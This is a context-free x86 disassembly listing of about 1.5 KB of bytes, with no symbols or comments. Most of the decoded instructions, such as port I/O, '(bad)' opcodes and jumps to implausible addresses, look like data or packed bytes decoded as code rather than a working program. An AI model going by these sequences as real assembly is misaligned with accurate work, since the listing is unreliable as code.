  413b9f:	5e                   	pop    %esi
  413ba0:	e1 53                	loope  0x413bf5
  413ba2:	eb 2e                	jmp    0x413bd2
  413ba4:	80 21 91             	andb   $0x91,(%ecx)
  413ba7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413ba8:	3a 22                	cmp    (%edx),%ah
  413baa:	61                   	popa
  413bab:	d8 fa                	fdivr  %st(2),%st
  413bad:	04 1d                	add    $0x1d,%al
  413baf:	ec                   	in     (%dx),%al
  413bb0:	5e                   	pop    %esi
  413bb1:	d7                   	xlat   %ds:(%ebx)
  413bb2:	0d f4 c3 09 76       	or     $0x7609c3f4,%eax
  413bb7:	84 13                	test   %dl,(%ebx)
  413bb9:	3f                   	aas
  413bba:	17                   	pop    %ss
  413bbb:	19 34 04             	sbb    %esi,(%esp,%eax,1)
  413bbe:	48                   	dec    %eax
  413bbf:	61                   	popa
  413bc0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413bc1:	ab                   	stos   %eax,%es:(%edi)
  413bc2:	72 48                	jb     0x413c0c
  413bc4:	0e                   	push   %cs
  413bc5:	86 7f 65             	xchg   %bh,0x65(%edi)
  413bc8:	7a 13                	jp     0x413bdd
  413bca:	a9 56 12 18 07       	test   $0x7181256,%eax
  413bcf:	bb 4d 9f 89 40       	mov    $0x40899f4d,%ebx
  413bd4:	f2 0d 25 da 83 12    	repnz or $0x1283da25,%eax
  413bda:	e5 9d                	in     $0x9d,%eax
  413bdc:	e1 9b                	loope  0x413b79
  413bde:	7c 05                	jl     0x413be5
  413be0:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  413be3:	eb 72                	jmp    0x413c57
  413be5:	18 0f                	sbb    %cl,(%edi)
  413be7:	48                   	dec    %eax
  413be8:	8b f8                	mov    %eax,%edi
  413bea:	60                   	pusha
  413beb:	48                   	dec    %eax
  413bec:	8d 4c 63 67          	lea    0x67(%ebx,%eiz,2),%ecx
  413bf0:	6d                   	insl   (%dx),%es:(%edi)
  413bf1:	01 16                	add    %edx,(%esi)
  413bf3:	a2 dd 51 7d 02       	mov    %al,0x27d51dd
  413bf8:	1b 23                	sbb    (%ebx),%esp
  413bfa:	11 45 7c             	adc    %eax,0x7c(%ebp)
  413bfd:	e8 40 77 cb 91       	call   0x920cb342
  413c02:	24 16                	and    $0x16,%al
  413c04:	e6 ff                	out    %al,$0xff
  413c06:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  413c09:	02 e4                	add    %ah,%ah
  413c0b:	65 9e                	gs sahf
  413c0d:	14 25                	adc    $0x25,%al
  413c0f:	0f dc 5f e0          	paddusb -0x20(%edi),%mm3
  413c13:	53                   	push   %ebx
  413c14:	3c 7e                	cmp    $0x7e,%al
  413c16:	15 ff 15 30 b0       	adc    $0xb03015ff,%eax
  413c1b:	e6 83                	out    %al,$0x83
  413c1d:	5a                   	pop    %edx
  413c1e:	7b e1                	jnp    0x413c01
  413c20:	b5 0b                	mov    $0xb,%ch
  413c22:	df 55 59             	fists  0x59(%ebp)
  413c25:	02 33                	add    (%ebx),%dh
  413c27:	db 59 e5             	fistpl -0x1b(%ecx)
  413c2a:	64 19 a4 e9 1f 74 34 	sbb    %esp,%fs:0x7434741f(%ecx,%ebp,8)
  413c31:	74 
  413c32:	02 6f e0             	add    -0x20(%edi),%ch
  413c35:	25 26 8b f9 c9       	and    $0xc9f98b26,%eax
  413c3a:	74 32                	je     0x413c6e
  413c3c:	97                   	xchg   %eax,%edi
  413c3d:	18 50 89             	sbb    %dl,-0x77(%eax)
  413c40:	c8 b3 7d db          	enter  $0x7db3,$0xdb
  413c44:	6c                   	insb   (%dx),%es:(%edi)
  413c45:	27                   	daa
  413c46:	38 59 09             	cmp    %bl,0x9(%ecx)
  413c49:	32 19                	xor    (%ecx),%bl
  413c4b:	89 01                	mov    %eax,(%ecx)
  413c4d:	c3                   	ret
  413c4e:	29 e9                	sub    %ebp,%ecx
  413c50:	d9 6e ef             	fldcw  -0x11(%esi)
  413c53:	b5 8f                	mov    $0x8f,%ch
  413c55:	18 40 17             	sbb    %al,0x17(%eax)
  413c58:	75 eb                	jne    0x413c45
  413c5a:	15 01 f9 66 4b       	adc    $0x4b66f901,%eax
  413c5f:	17                   	pop    %ss
  413c60:	31 10                	xor    %edx,(%eax)
  413c62:	d0 79 31             	sarb   $1,0x31(%ecx)
  413c65:	e7 d1                	out    %eax,$0xd1
  413c67:	b1 a6                	mov    $0xa6,%cl
  413c69:	9c                   	pushf
  413c6a:	8f                   	(bad)
  413c6b:	9f                   	lahf
  413c6c:	b0 ae                	mov    $0xae,%al
  413c6e:	29 d8                	sub    %ebx,%eax
  413c70:	c3                   	ret
  413c71:	cc                   	int3
  413c72:	f1                   	int1
  413c73:	e1 a7                	loope  0x413c1c
  413c75:	5a                   	pop    %edx
  413c76:	e3 7f                	jecxz  0x413cf7
  413c78:	52                   	push   %edx
  413c79:	cb                   	lret
  413c7a:	29 f4                	sub    %esi,%esp
  413c7c:	dd f6                	(bad)
  413c7e:	b5 32                	mov    $0x32,%ch
  413c80:	0c 84                	or     $0x84,%al
  413c82:	aa                   	stos   %al,%es:(%edi)
  413c83:	0d 25 34 b4 8b       	or     $0x8bb43425,%eax
  413c88:	98                   	cwtl
  413c89:	04 3d                	add    $0x3d,%al
  413c8b:	f7 0d ff b6 0f 80 fb 	testl  $0x747718fb,0x800fb6ff
  413c92:	18 77 74 
  413c95:	8a c3                	mov    %bl,%al
  413c97:	8a 98 3c 41 09 70    	mov    0x7009413c(%eax),%bl
  413c9d:	3c c2                	cmp    $0xc2,%al
  413c9f:	ae                   	scas   %es:(%edi),%al
  413ca0:	2d 21 15 ac ab       	sub    $0xabac1521,%eax
  413ca5:	83 e0 7f             	and    $0x7f,%eax
  413ca8:	14 38                	adc    $0x38,%al
  413caa:	d0 b1 7f 8f b8 c3    	shlb   $1,-0x3c477081(%ecx)
  413cb0:	50                   	push   %eax
  413cb1:	52                   	push   %edx
  413cb2:	51                   	push   %ecx
  413cb3:	3a 83 b8 ed 8b 10    	cmp    0x108bedb8(%ebx),%al
  413cb9:	bb 5d cf 58 75       	mov    $0x7558cf5d,%ebx
  413cbe:	7b 31                	jnp    0x413cf1
  413cc0:	c0 97 13 74 3d b4 c8 	rclb   $0xc8,-0x4bc28bed(%edi)
  413cc7:	58                   	pop    %eax
  413cc8:	5a                   	pop    %edx
  413cc9:	89 3d 3c 04 6f 5f    	mov    %edi,0x5f6f043c
  413ccf:	68 f1 f5 30 57       	push   $0x5730f5f1
  413cd4:	ee                   	out    %al,(%dx)
  413cd5:	89 c6                	mov    %eax,%esi
  413cd7:	89 d7                	mov    %edx,%edi
  413cd9:	d1 39                	sarl   $1,(%ecx)
  413cdb:	f7 77 15             	divl   0x15(%edi)
  413cde:	fe                   	(bad)
  413cdf:	ef                   	out    %eax,(%dx)
  413ce0:	e0 13                	loopne 0x413cf5
  413ce2:	74 2f                	je     0x413d13
  413ce4:	58                   	pop    %eax
  413ce5:	78 2a                	js     0x413d11
  413ce7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  413ce9:	89 c1                	mov    %eax,%ecx
  413ceb:	83 e1 03             	and    $0x3,%ecx
  413cee:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  413cf0:	54                   	push   %esp
  413cf1:	52                   	push   %edx
  413cf2:	b0 df                	mov    $0xdf,%al
  413cf4:	bf 3d 74 31 fc       	mov    $0xfc31743d,%edi
  413cf9:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  413cfd:	18 11                	sbb    %dl,(%ecx)
  413cff:	fd                   	std
  413d00:	19 fa                	sbb    %edi,%edx
  413d02:	cd c2                	int    $0xc2
  413d04:	e0 b6                	loopne 0x413cbc
  413d06:	02 c7                	add    %bh,%al
  413d08:	1f                   	pop    %ds
  413d09:	75 37                	jne    0x413d42
  413d0b:	86 db                	xchg   %bl,%bl
  413d0d:	2e d8 d5             	cs fcom %st(5)
  413d10:	eb 08                	jmp    0x413d1a
  413d12:	a0 00 dc 09 8a       	mov    0x8a09dc00,%al
  413d17:	03 f6                	add    %esi,%esi
  413d19:	12 db                	adc    %bl,%bl
  413d1b:	0b ff                	or     %edi,%edi
  413d1d:	04 3c                	add    $0x3c,%al
  413d1f:	20 76 ee             	and    %dh,-0x12(%esi)
  413d22:	80 3b 22             	cmpb   $0x22,(%ebx)
  413d25:	7f 80                	jg     0x413ca7
  413d27:	7b 01                	jnp    0x413d2a
  413d29:	05 05 1a 74 b3       	add    $0xb3741a05,%eax
  413d2e:	ed                   	in     (%dx),%eax
  413d2f:	ff 02                	incl   (%edx)
  413d31:	eb e6                	jmp    0x413d19
  413d33:	33 ed                	xor    %ebp,%ebp
  413d35:	8b fb                	mov    %ebx,%edi
  413d37:	eb 43                	jmp    0x413d7c
  413d39:	3c 0e                	cmp    $0xe,%al
  413d3b:	31 2b                	xor    %ebp,(%ebx)
  413d3d:	35 0e 9e 6c 89       	xor    $0x896c9e0e,%eax
  413d42:	83 d0 2b             	adc    $0x2b,%eax
  413d45:	c9                   	leave
  413d46:	ea 3b 22 75 e8 b7 15 	ljmp   $0x15b7,$0xe875223b
  413d4d:	b6 50                	mov    $0x50,%dh
  413d4f:	1e                   	push   %ds
  413d50:	18 26                	sbb    %ah,(%esi)
  413d52:	5e                   	pop    %esi
  413d53:	77 b7                	ja     0x413d0c
  413d55:	7f a3                	jg     0x413cfa
  413d57:	5d                   	pop    %ebp
  413d58:	07                   	pop    %es
  413d59:	e8 d5 16 2e 9c       	call   0x9c6f5433
  413d5e:	a0 8b 3e 33 f6       	mov    0xf6333e8b,%al
  413d63:	eb 51                	jmp    0x413db6
  413d65:	fd                   	std
  413d66:	27                   	daa
  413d67:	93                   	xchg   %eax,%ebx
  413d68:	75 37                	jne    0x413da1
  413d6a:	38 32                	cmp    %dh,(%edx)
  413d6c:	15 3b c3 76 0b       	adc    $0xb76c33b,%eax
  413d71:	8a 13                	mov    (%ebx),%dl
  413d73:	88 cf                	mov    %cl,%bh
  413d75:	64 b7 1b             	fs mov $0x1b,%bh
  413d78:	f0 43                	lock inc %ebx
  413d7a:	46                   	inc    %esi
  413d7b:	0a 77 f5             	or     -0xb(%edi),%dh
  413d7e:	60                   	pusha
  413d7f:	e1 1f                	loope  0x413da0
  413d81:	41                   	inc    %ecx
  413d82:	a1 4b 65 2d 67       	mov    0x672d654b,%eax
  413d87:	a9 a2 85 ab d6       	test   $0xd6ab85a2,%eax
  413d8c:	64 cb                	fs lret
  413d8e:	81 fa 3a 75 fd c7    	cmp    $0xc7fd753a,%edx
  413d94:	70 09                	jo     0x413d9f
  413d96:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413d97:	29 f0                	sub    %esi,%eax
  413d99:	85 f6                	test   %esi,%esi
  413d9b:	75 1e                	jne    0x413dbb
  413d9d:	68 05 aa 8d 68       	push   $0x688daa05
  413da2:	35 06 34 b3 50       	xor    $0x50b33406,%eax
  413da7:	ec                   	in     (%dx),%al
  413da8:	14 63                	adc    $0x63,%al
  413daa:	d4 f1                	aam    $0xf1
  413dac:	fd                   	std
  413dad:	ac                   	lods   %ds:(%esi),%al
  413dae:	53                   	push   %ebx
  413daf:	2a e0                	sub    %al,%ah
  413db1:	eb 1e                	jmp    0x413dd1
  413db3:	58                   	pop    %eax
  413db4:	fc                   	cld
  413db5:	f9                   	stc
  413db6:	d3 d1                	rcl    %cl,%ecx
  413db8:	a2 b5 63 ef 16       	mov    %al,0x16ef63b5
  413dbd:	8c 0a                	mov    %cs,(%edx)
  413dbf:	33 5e 98             	xor    -0x68(%esi),%ebx
  413dc2:	b9 ed 4d a1 03       	mov    $0x3a14ded,%ecx
  413dc7:	4e                   	dec    %esi
  413dc8:	eb e9                	jmp    0x413db3
  413dca:	50                   	push   %eax
  413dcb:	08 3c 5f             	or     %bh,(%edi,%ebx,2)
  413dce:	57                   	push   %edi
  413dcf:	c7 07 19 57 65 5c    	movl   $0x5c655719,(%edi)
  413dd5:	a3 0b 11 d8 08       	mov    %eax,0x8d8110b
  413dda:	1f                   	pop    %ds
  413ddb:	2d 5d 4b 5a af       	sub    $0xaf5a4b5d,%eax
  413de0:	64 0c 8d             	fs or  $0x8d,%al
  413de3:	31 46 6a             	xor    %eax,0x6a(%esi)
  413de6:	0f 1c 3e             	nopl   (%esi)
  413de9:	06                   	push   %es
  413dea:	3a 89 f7 0c 7e 08    	cmp    0x87e0cf7(%ecx),%cl
  413df0:	b8 d2 75 29 e4       	mov    $0xe42975d2,%eax
  413df5:	a3 3d 6d db b7       	mov    %eax,0xb7db6d3d
  413dfa:	d4 41                	aam    $0x41
  413dfc:	10 04 0c             	adc    %al,(%esp,%ecx,1)
  413dff:	8e 8d 09 50 3a 52    	mov    0x523a5009(%ebp),%cs
  413e05:	ec                   	in     (%dx),%al
  413e06:	0c b9                	or     $0xb9,%al
  413e08:	03 14 50             	add    (%eax,%edx,2),%edx
  413e0b:	f8                   	clc
  413e0c:	00 ac f6 42 31 9a a3 	add    %ch,-0x5c65cebe(%esi,%esi,8)
  413e13:	0e                   	push   %cs
  413e14:	02 42 6d             	add    0x6d(%edx),%al
  413e17:	75 06                	jne    0x413e1f
  413e19:	28 f1                	sub    %dh,%cl
  413e1b:	e8 f1 b5 7a 03       	call   0x3bbf411
  413e20:	8d 63 67             	lea    0x67(%ebx),%esp
  413e23:	b3 1f                	mov    $0x1f,%bl
  413e25:	b9 1d bd 73 0c       	mov    $0xc73bd1d,%ecx
  413e2a:	d7                   	xlat   %ds:(%ebx)
  413e2b:	4d                   	dec    %ebp
  413e2c:	26 6a d8             	es push $0xffffffd8
  413e2f:	4f                   	dec    %edi
  413e30:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  413e31:	19 b0 56 40 d4 07    	sbb    %esi,0x7d44056(%eax)
  413e37:	34 c0                	xor    $0xc0,%al
  413e39:	7b d4                	jnp    0x413e0f
  413e3b:	aa                   	stos   %al,%es:(%edi)
  413e3c:	01 59 54             	add    %ebx,0x54(%ecx)
  413e3f:	70 7b                	jo     0x413ebc
  413e41:	e8 ba 8f 10 46       	call   0x4651ce00
  413e46:	7c 48                	jl     0x413e90
  413e48:	0f 94 51 90          	sete   -0x70(%ecx)
  413e4c:	0f 66 43 ee          	pcmpgtd -0x12(%ebx),%mm0
  413e50:	da ad c9 b0 d7 38    	fisubrl 0x38d7b0c9(%ebp)
  413e56:	37                   	aaa
  413e57:	18 98 84 bb 6d 34    	sbb    %bl,0x346dbb84(%eax)
  413e5d:	66 71 7b             	data16 jno 0x413edb
  413e60:	7a 31                	jp     0x413e93
  413e62:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413e63:	46                   	inc    %esi
  413e64:	0c 02                	or     $0x2,%al
  413e66:	ed                   	in     (%dx),%eax
  413e67:	dd 1b                	fstpl  (%ebx)
  413e69:	71 10                	jno    0x413e7b
  413e6b:	66 7a 2d             	data16 jp 0x413e9b
  413e6e:	b1 d7                	mov    $0xd7,%cl
  413e70:	d4 0b                	aam    $0xb
  413e72:	48                   	dec    %eax
  413e73:	74 20                	je     0x413e95
  413e75:	02 ec                	add    %ah,%ch
  413e77:	8a af bb 2e cf 1a    	mov    0x1acf2ebb(%edi),%ch
  413e7d:	50                   	push   %eax
  413e7e:	b8 de ba 2b b9       	mov    $0xb92bbade,%eax
  413e83:	03 e4                	add    %esp,%esp
  413e85:	eb e8                	jmp    0x413e6f
  413e87:	4f                   	dec    %edi
  413e88:	f3 46                	repz inc %esi
  413e8a:	1c 20                	sbb    $0x20,%al
  413e8c:	28 09                	sub    %cl,(%ecx)
  413e8e:	27                   	daa
  413e8f:	17                   	pop    %ss
  413e90:	40                   	inc    %eax
  413e91:	4c                   	dec    %esp
  413e92:	c8 17 e9 02          	enter  $0xe917,$0x2
  413e96:	2c 28                	sub    $0x28,%al
  413e98:	c0 60 e0 e6          	shlb   $0xe6,-0x20(%eax)
  413e9c:	c8 cd 06 24          	enter  $0x6cd,$0x24
  413ea0:	ac                   	lods   %ds:(%esi),%al
  413ea1:	20 5c 80 7e          	and    %bl,0x7e(%eax,%eax,4)
  413ea5:	48                   	dec    %eax
  413ea6:	b7 ee                	mov    $0xee,%bh
  413ea8:	56                   	push   %esi
  413ea9:	b6 0e                	mov    $0xe,%dh
  413eab:	b2 d3                	mov    $0xd3,%dl
  413ead:	68 80 06 51 07       	push   $0x7510680
  413eb2:	52                   	push   %edx
  413eb3:	50                   	push   %eax
  413eb4:	0f 6d                	(bad)
  413eb6:	61                   	popa
  413eb7:	ec                   	in     (%dx),%al
  413eb8:	8d 46 48             	lea    0x48(%esi),%eax
  413ebb:	d4 84                	aam    $0x84
  413ebd:	0c ff                	or     $0xff,%al
  413ebf:	1d 8b 89 df ed       	sbb    $0xeddf898b,%eax
  413ec4:	dd ff                	(bad)
  413ec6:	06                   	push   %es
  413ec7:	66 81 7e 04 b3 d7    	cmpw   $0xd7b3,0x4(%esi)
  413ecd:	0f 85 c3 17 66 ff    	jne    0xffa75696
  413ed3:	4e                   	dec    %esi
  413ed4:	04 27                	add    $0x27,%al
  413ed6:	ff 36                	push   (%esi)
  413ed8:	23 94 6e db ed b6 40 	and    0x40b6eddb(%esi,%ebp,2),%edx
  413edf:	21 e6                	and    %esp,%esi
  413ee1:	07                   	pop    %es
  413ee2:	2d 81 04 73 02       	sub    $0x2730481,%eax
  413ee7:	bb 6a 4a 73 c7       	mov    $0xc7734a6a,%ebx
  413eec:	9a b3 50 1b c4 ca 5b 	lcall  $0x5bca,$0xc41b50b3
  413ef3:	89 e2                	mov    %esp,%edx
  413ef5:	57                   	push   %edi
  413ef6:	60                   	pusha
  413ef7:	db 67 1f             	(bad) 0x1f(%edi)
  413efa:	1c 8d                	sbb    $0x8d,%al
  413efc:	96                   	xchg   %eax,%esi
  413efd:	c3                   	ret
  413efe:	52                   	push   %edx
  413eff:	20 ac 5a 48 51 a8 37 	and    %ch,0x37a85148(%edx,%ebx,2)
  413f06:	be 7f 33 36 39       	mov    $0x3936337f,%esi
  413f0b:	d0 73 6b             	shlb   $1,0x6b(%ebx)
  413f0e:	80 bc 06 1c 0e 04 40 	cmpb   $0xeb,0x40040e1c(%esi,%eax,1)
  413f15:	eb 
  413f16:	d9 0b                	(bad) (%ebx)
  413f18:	c8 ed ef 6a          	enter  $0xefed,$0x6a
  413f1c:	02 49 29             	add    0x29(%ecx),%cl
  413f1f:	d0 3d 0d b9 b7 bd    	sarb   $1,0xbdb7b90d
  413f25:	ff                   	(bad)
  413f26:	bc 48 75 76 eb       	mov    $0xeb767548,%esp
  413f2b:	3d 8d 86 2c c8       	cmp    $0xc82c868d,%eax
  413f30:	08 18                	or     %bl,(%eax)
  413f32:	d6                   	salc
  413f33:	be d4 6f e1 cf       	mov    $0xcfe16fd4,%esi
  413f38:	35 14 a8 b2 d7       	xor    $0xd7b2a814,%eax
  413f3d:	80 6a f6 eb          	subb   $0xeb,-0xa(%edx)
  413f41:	0e                   	push   %cs
  413f42:	6b d4 1c             	imul   $0x1c,%esp,%edx
  413f45:	5c                   	pop    %esp
  413f46:	d4 c3                	aam    $0xc3
  413f48:	cd 0b                	int    $0xb
  413f4a:	28 4d 6d             	sub    %cl,0x6d(%ebp)
  413f4d:	67 9b                	addr16 fwait
  413f4f:	6f                   	outsl  %ds:(%esi),(%dx)
  413f50:	f5                   	cmc
  413f51:	d2 9c 74 39 ce b1 25 	rcrb   %cl,0x25b1ce39(%esp,%esi,2)
  413f58:	17                   	pop    %ss
  413f59:	a1 b0 75 9c 50       	mov    0x509c75b0,%eax
  413f5e:	8c 5c 10 19          	mov    %ds,0x19(%eax,%edx,1)
  413f62:	02 8a 17 70 56 6a    	add    0x6a567017(%edx),%cl
  413f68:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413f69:	60                   	pusha
  413f6a:	8f c5                	pop    %ebp
  413f6c:	1a 7c c2 ec          	sbb    -0x14(%edx,%eax,8),%bh
  413f70:	61                   	popa
  413f71:	b3 ad                	mov    $0xad,%bl
  413f73:	46                   	inc    %esi
  413f74:	b8 69 53 ea 0c       	mov    $0xcea5369,%eax
  413f79:	e7 0b                	out    %eax,$0xb
  413f7b:	35 82 75 dd bb       	xor    $0xbbdd7582,%eax
  413f80:	d4 6b                	aam    $0x6b
  413f82:	ba 61 e3 bd 7b       	mov    $0x7bbde361,%edx
  413f87:	8a 16                	mov    (%esi),%dl
  413f89:	1c 34                	sbb    $0x34,%al
  413f8b:	8d 83 0a 67 14 e5    	lea    -0x1aeb98f6(%ebx),%eax
  413f91:	6d                   	insl   (%dx),%es:(%edi)
  413f92:	eb b8                	jmp    0x413f4c
  413f94:	30 d3                	xor    %dl,%bl
  413f96:	a0 24 a3 66 10       	mov    0x1066a324,%al
  413f9b:	06                   	push   %es
  413f9c:	0f 62 04 cc          	punpckldq (%esp,%ecx,8),%mm0
  413fa0:	67 a9 43 18 cc fd    	addr16 test $0xfdcc1843,%eax
  413fa6:	2b 36                	sub    (%esi),%esi
  413fa8:	81 ff b5 64 07 2d    	cmp    $0x2d0764b5,%edi
  413fae:	74 8d                	je     0x413f3d
  413fb0:	53                   	push   %ebx
  413fb1:	48                   	dec    %eax
  413fb2:	59                   	pop    %ecx
  413fb3:	e9 17 a8 59 39       	jmp    0x399ae7cf
  413fb8:	7e c6                	jle    0x413f80
  413fba:	44                   	inc    %esp
  413fbb:	03 48 7b             	add    0x7b(%eax),%ecx
  413fbe:	b3 df                	mov    $0xdf,%bl
  413fc0:	3d 19 cc 07 8b       	cmp    $0x8b07cc19,%eax
  413fc5:	f1                   	int1
  413fc6:	8b fa                	mov    %edx,%edi
  413fc8:	76 45                	jbe    0x41400f
  413fca:	10 0f                	adc    %cl,(%edi)
  413fcc:	b7 53                	mov    $0x53,%bh
  413fce:	3f                   	aas
  413fcf:	3b b6 e0 04 23 d0    	cmp    -0x2fdcfb20(%esi),%esi
  413fd5:	d9 58 d4             	fstps  -0x2c(%eax)
  413fd8:	45                   	inc    %ebp
  413fd9:	fc                   	cld
  413fda:	f7 ee                	imul   %esi
  413fdc:	50                   	push   %eax
  413fdd:	2c ab                	sub    $0xab,%al
  413fdf:	e3 8e                	jecxz  0x413f6f
  413fe1:	57                   	push   %edi
  413fe2:	92                   	xchg   %eax,%edx
  413fe3:	ff 55 0c             	call   *0xc(%ebp)
  413fe6:	90                   	nop
  413fe7:	11 d4                	adc    %edx,%esp
  413fe9:	76 d1                	jbe    0x413fbc
  413feb:	a2 18 a9 04 df       	mov    %al,0xdf04a918
  413ff0:	d2 f7                	shl    %cl,%bh
  413ff2:	bb 6e 73 ad a8       	mov    $0xa8ad736e,%ebx
  413ff7:	0c 0a                	or     $0xa,%al
  413ff9:	14 f5                	adc    $0xf5,%al
  413ffb:	0a 06                	or     (%esi),%al
  413ffd:	8b 55 b6             	mov    -0x4a(%ebp),%edx
  414000:	b7 5a                	mov    $0x5a,%bh
  414002:	8a fc                	mov    %ah,%bh
  414004:	c2 23 86             	ret    $0x8623
  414007:	fc                   	cld
  414008:	74 1e                	je     0x414028
  41400a:	0e                   	push   %cs
  41400b:	08 2c 73             	or     %ch,(%ebx,%esi,2)
  41400e:	1d cb 2f 43 67       	sbb    $0x67432fcb,%eax
  414013:	b1 10                	mov    $0x10,%cl
  414015:	6d                   	insl   (%dx),%es:(%edi)
  414016:	3c 7a                	cmp    $0x7a,%al
  414018:	18 54 c2 10          	sbb    %dl,0x10(%edx,%eax,8)
  41401c:	97                   	xchg   %eax,%edi
  41401d:	ca 5d 77             	lret   $0x775d
  414020:	b7 3b                	mov    $0x3b,%bh
  414022:	6e                   	outsb  %ds:(%esi),(%dx)
  414023:	e0 68                	loopne 0x41408d
  414025:	b2 a0                	mov    $0xa0,%dl
  414027:	68 e0 2a a5 6a       	push   $0x6aa52ae0
  41402c:	65 28 1a             	sub    %bl,%gs:(%edx)
  41402f:	e4 5b                	in     $0x5b,%al
  414031:	d5 a6                	aad    $0xa6
  414033:	43                   	inc    %ebx
  414034:	6d                   	insl   (%dx),%es:(%edi)
  414035:	1d 04 bf 74 f6       	sbb    $0xf674bf04,%eax
  41403a:	66 7d a3             	data16 jge 0x413fe0
  41403d:	5d                   	pop    %ebp
  41403e:	d8 7a 66             	fdivrs 0x66(%edx)
  414041:	3d 68 72 2f 05       	cmp    $0x52f7268,%eax
  414046:	3d 77 29 66 25       	cmp    $0x25662977,%eax
  41404b:	be 55 68 ad 2e       	mov    $0x2ead6855,%esi
  414050:	09 03                	or     %eax,(%ebx)
  414052:	68 2a ff 53 1c       	push   $0x1c53ff2a
  414057:	8b 72 ef             	mov    -0x11(%edx),%esi
  41405a:	33 76 0a             	xor    0xa(%esi),%esi
  41405d:	24 74                	and    $0x74,%al
  41405f:	1b fd                	sbb    %ebp,%edi
  414061:	6c                   	insb   (%dx),%es:(%edi)
  414062:	d6                   	salc
  414063:	4c                   	dec    %esp
  414064:	5b                   	pop    %ebx
  414065:	b5 b8                	mov    $0xb8,%ch
  414067:	26 3c c5             	es cmp $0xc5,%al
  41406a:	9e                   	sahf
  41406b:	80 ec 6e             	sub    $0x6e,%ah
  41406e:	52                   	push   %edx
  41406f:	5b                   	pop    %ebx
  414070:	1a 4f 57             	sbb    0x57(%edi),%cl
  414073:	83 ce ff             	or     $0xffffffff,%esi
  414076:	58                   	pop    %eax
  414077:	63 12                	arpl   %edx,(%edx)
  414079:	8d                   	lea    (bad),%edi
  41407a:	fc                   	cld
  41407b:	b0 d7                	mov    $0xd7,%al
  41407d:	76 29                	jbe    0x4140a8
  41407f:	23 c2                	and    %edx,%eax
  414081:	8f                   	(bad)
  414082:	8d 91 5a 9b 48 83    	lea    -0x7cb764a6(%ecx),%edx
  414088:	8d 53 16             	lea    0x16(%ebx),%edx
  41408b:	45                   	inc    %ebp
  41408c:	8c 6c 8b b5          	mov    %gs,-0x4b(%ebx,%ecx,4)
  414090:	15 35 ef 14 eb       	adc    $0xeb14ef35,%eax
  414095:	4a                   	dec    %edx
  414096:	4a                   	dec    %edx
  414097:	97                   	xchg   %eax,%edi
  414098:	17                   	pop    %ss
  414099:	30 57 e6             	xor    %dl,-0x1a(%edi)
  41409c:	c7                   	(bad)
  41409d:	88 cd                	mov    %cl,%ch
  41409f:	c1 e0 6a             	shl    $0x6a,%eax
  4140a2:	e9 f3 0f dc 05       	jmp    0x61d509a
  4140a7:	89 d1                	mov    %edx,%ecx
  4140a9:	e8 09 f3 ab 89       	call   0x89ed33b7
  4140ae:	d1 aa 5f ab 63 2f    	shrl   $1,0x2f63ab5f(%edx)
  4140b4:	7d bd                	jge    0x414073
  4140b6:	31 db                	xor    %ebx,%ebx
  4140b8:	69 93 62 05 04 08 42 	imul   $0xf70a8942,0x8040562(%ebx),%edx
  4140bf:	89 0a f7 
  4140c2:	06                   	push   %es
  4140c3:	61                   	popa
  4140c4:	58                   	pop    %eax
  4140c5:	83 e2 d0             	and    $0xffffffd0,%edx
  4140c8:	87 e2                	xchg   %esp,%edx
  4140ca:	f6 d9                	neg    %cl
  4140cc:	69 ec 92 ca 0a 76    	imul   $0x760aca92,%esp,%ebp
  4140d2:	be 74 af 71 eb       	mov    $0xeb71af74,%esi
  4140d7:	42                   	inc    %edx
  4140d8:	2d 65 dc cf 31       	sub    $0x31cfdc65,%eax
  4140dd:	11 c3                	adc    %eax,%ebx
  4140df:	66 be d1 d3          	mov    $0xd3d1,%si
  4140e3:	1b 91 81 ea b0 d0    	sbb    -0x2f4f157f(%ecx),%edx
  4140e9:	15 b5 03 0f 87       	adc    $0x870f03b5,%eax
  4140ee:	a2 7b b1 06 e7       	mov    %al,0xe706b17b
  4140f3:	26 fa                	es cli
  4140f5:	86 05 97 4f cc 6c    	xchg   %al,0x6ccc4f97
  4140fb:	7a 6b                	jp     0x414168
  4140fd:	40                   	inc    %eax
  4140fe:	4d                   	dec    %ebp
  4140ff:	07                   	pop    %es
  414100:	24 74                	and    $0x74,%al
  414102:	2c a4                	sub    $0xa4,%al
  414104:	43                   	inc    %ebx
  414105:	1c bb                	sbb    $0xbb,%al
  414107:	47                   	inc    %edi
  414108:	da 8e 7b 48 31 60    	fimull 0x6031487b(%esi)
  41410e:	ce                   	into
  41410f:	8a 15 0c 83 83 e2    	mov    0xe283830c,%dl
  414115:	1e                   	push   %ds
  414116:	c9                   	leave
  414117:	dd e2                	fucom  %st(2)
  414119:	70 c1                	jo     0x4140dc
  41411b:	ea 23 92 58 0b ec 83 	ljmp   $0x83ec,$0xb589223
  414122:	ef                   	out    %eax,(%dx)
  414123:	03 ab c4 48 2d f0    	add    -0xfd2b73c(%ebx),%ebp
  414129:	e5 47                	in     $0x47,%eax
  41412b:	95                   	xchg   %eax,%ebp
  41412c:	08 2f                	or     %ch,(%edi)
  41412e:	56                   	push   %esi
  41412f:	d3 1b                	rcrl   %cl,(%ebx)
  414131:	47                   	inc    %edi
  414132:	4b                   	dec    %ebx
  414133:	06                   	push   %es
  414134:	0b 2e                	or     (%esi),%ebp
  414136:	0c 2f                	or     $0x2f,%al
  414138:	99                   	cltd
  414139:	90                   	nop
  41413a:	0a 84 e2 43 74 24 4e 	or     0x4e247443(%edx,%eiz,8),%al
  414141:	7f ee                	jg     0x414131
  414143:	46                   	inc    %esi
  414144:	15 eb 30 73 6c       	adc    $0x6c7330eb,%eax
  414149:	83 ff 03             	cmp    $0x3,%edi
  41414c:	3b 98 7d 7c 92 2f    	cmp    0x2f927c7d(%eax),%ebx
  414152:	eb de                	jmp    0x414132
  414154:	b8 66 fa 0b ec       	mov    $0xec0bfa66,%eax
  414159:	f8                   	clc
  41415a:	9e                   	sahf
  41415b:	04 cb                	add    $0xcb,%al
  41415d:	51                   	push   %ecx
